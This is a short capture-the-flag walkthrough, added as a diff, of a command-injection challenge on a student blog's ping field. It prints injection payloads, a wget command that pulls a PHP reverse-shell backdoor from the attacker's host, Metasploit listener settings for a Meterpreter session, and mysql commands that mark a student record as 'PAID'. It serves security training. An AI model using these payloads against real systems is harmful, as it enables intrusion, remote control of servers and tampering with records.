@@ -1,0 +1,57 @@
+Challenge 045 : Tricky Injection Challenge  Trip To Dawki RCE
+
+Looks like a paint blog of student 
+
+let's put input at the ip_searchfield
+' "
+8.8.8.8
+8.8.8.8; whoami
+8.8.8.8 && whoami
+
+127.0.0.1 || ls -al  : gives the ouput of ping and as well all the files in the same directory
+
+from given information payload file was WAS backdoor.php
+here the list shows the file could be backdoor.txt
+let's see the content of it
+
+1.1.1.1 || cat backdoor.txt
+looks like encoded.. let's copy this content of text file onto some of our notepad and decode it.
+first urldecode and then base64 decode it.. u'll get a php code.. looks like a php backdoor that establishes a reverse connection on the specified LHOST and LPORT look like a local ip.. let's edit this payload to get the connection to our ip.. with lhost as "your ip" my case : 192.168.0.104 and let the LPORT be 4444
+
+Add <?php ?> tags at the start and end of the backdoor 
+let's save this file on our local system on localhost as backdoor.txt
+
+let's get this edited backdoor on the SERVER
+searchfield :  || wget http://192.168.0.104/backdoor.txt -O backdoor.php
+searchfield : `wget http://192.168.0.104/backdoor.txt -O backdoor.php`			192.168.0.104 is my ip.. check in for ur case : ifconfig
+	      `wget http://192.168.0.104/backdoor.txt -O backdoor.php`
+
+now 127.0.0.1 || ls -al gives backdoor.php
+
+let's execute this php.. before that 
+let's FIRE up metasploit or armitage and turn up our listener
+
+armitage : 
+use exploit/multi/handler
+set PAYLOAD php/meterpreter/reverse_tcp
+show options
+set LHOST 192.168.0.104
+set LPORT 4444
+
+exploit
+
+now let's execute our backdoor.php
+searchfield : 11.1.1.11 || php -f backdoor.php
+
+and u'll get the meterpreter session started on ur armitage.. gaining access to the server.. let's do our work now :D
+
+
+echo "show databases;" | mysql -u root --password=password			//gives all the databases.. we need TripDawki
+echo "select * from TripDawki.students;" | mysql -u root --password=password    //select that database
+echo "UPDATE TripDawki.students set payment='PAID' where id=15;" | mysql -u root --password=password 	//our target change the payment mode to PAID
+
+DONE !!
+
+play around with the server YOU have REMOTE access to it.
+
+HOPE you enjoyed this challenge !!!
